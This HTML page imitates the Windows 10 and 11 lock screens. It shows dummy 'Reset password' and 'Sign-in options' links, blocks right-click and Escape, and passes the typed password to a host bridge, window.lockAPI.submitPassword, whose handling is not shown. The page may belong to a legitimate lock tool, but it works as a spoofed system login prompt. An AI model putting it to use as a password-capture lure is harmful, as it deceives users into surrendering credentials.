<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Windows Lock Screen</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden; user-select: none; cursor: default;
            background-color: #000;
            background-size: cover; background-position: center center;
            background-repeat: no-repeat;
            transition: background-image 0.5s ease-in-out;
        }
        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        
        /* --- Windows 10 Design --- */
        body.win10 .overlay {
            background: rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
        }
        body.win10 .user-icon {
            width: 150px; height: 150px; border-radius: 50%;
            background: #888 url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23fff"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>') center no-repeat;
            background-size: 100px; margin-bottom: 25px;
        }
        body.win10 .username {
            font-size: 36px; color: white; margin-bottom: 30px; font-weight: 300; letter-spacing: 1px;
        }
        body.win10 .password-container {
            display: flex;
            width: 320px;
            height: 32px;
            border: 2px solid transparent;
            box-sizing: border-box;
        }
        body.win10 .password-container:focus-within {
            border: 2px solid #0078D7;
        }
        body.win10 input[type="password"] {
            flex-grow: 1;
            padding: 0 10px;
            font-size: 15px;
            border: none;
            background: #ffffff;
            color: black;
            outline: none;
            border-radius: 0;
            height: 100%;
        }
        body.win10 input[type="password"]::placeholder { color: #777; font-weight: normal; }
        body.win10 .submit-btn {
            width: 32px;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            outline: none;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }
        body.win10 .submit-btn:hover {
            background: rgba(0, 0, 0, 0.8);
        }

        /* --- Windows 11 Design --- */
        body.win11 .overlay {
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(30px);
        }
        body.win11 .user-icon {
            width: 180px; height: 180px; border-radius: 50%;
            background: #888 url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23fff"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>') center no-repeat;
            background-size: 120px; margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        body.win11 .username {
            font-size: 32px; color: white; margin-bottom: 25px; font-weight: 600;
        }
        body.win11 .password-container {
            display: flex;
            align-items: center;
            width: 320px;
            height: 40px;
            background: rgba(20, 20, 20, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-bottom: 2px solid #0078D7;
            border-radius: 4px;
            box-sizing: border-box;
            transition: all 0.2s;
        }
        body.win11 .password-container:focus-within {
            border: 2px solid #0078D7;
            background: rgba(0, 0, 0, 0.8);
        }
        body.win11 input[type="password"] {
            flex-grow: 1;
            padding: 0 12px;
            font-size: 15px;
            border: none;
            background: transparent;
            color: white;
            outline: none;
            height: 100%;
        }
        body.win11 input[type="password"]::placeholder { color: rgba(255,255,255,0.8); font-weight: normal; }
        body.win11 .submit-btn {
            width: 40px;
            height: 100%;
            background: transparent;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            outline: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        body.win11 .submit-btn:hover {
            color: #ddd;
        }

        .dummy-links {
            margin-top: 30px;
            display: flex;
            flex-direction: column;
            gap: 15px;
            align-items: center;
        }
        .dummy-links .link {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
            cursor: pointer;
        }
        .dummy-links .link:hover {
            color: white;
            text-decoration: underline;
        }

        .error-msg { color: #ffb900; margin-top: 15px; font-size: 14px; opacity: 0; transition: opacity 0.3s; }
    </style>
</head>
<body class="win10" id="bodyEl">
    <div class="overlay">
        <div class="user-icon"></div>
        <div class="username" id="username">User</div>
        
        <div class="password-container">
            <input type="password" id="pwd" placeholder="Password" autofocus autocomplete="off">
            <button class="submit-btn" id="submitBtn">➔</button>
        </div>

        <div class="dummy-links">
            <div class="link">Reset password</div>
            <div class="link">Sign-in options</div>
        </div>

        <div class="error-msg" id="errorMsg">The password is incorrect. Try again.</div>
    </div>

    <script>
        window.lockAPI.getLockscreenData().then(data => {
            if (data.os) document.getElementById('bodyEl').className = data.os;
            if (data.username) document.getElementById('username').innerText = data.username;
            if (data.bgImage) {
                document.body.style.backgroundImage = `url('${data.bgImage}')`;
            } else {
                document.body.style.backgroundImage = `url('https://w.wallhaven.cc/full/wq/wallhaven-wqery7.jpg')`;
            }
        });

        const pwdInput = document.getElementById('pwd');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');

        function submit() {
            const pwd = pwdInput.value;
            if (!pwd) return;
            window.lockAPI.submitPassword(pwd);
        }

        pwdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') submit();
        });

        submitBtn.addEventListener('click', submit);
        
        // Prevent right click and other keys
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.addEventListener('keydown', (e) => {
            if(e.key === 'Escape' || e.key === 'Windows') {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
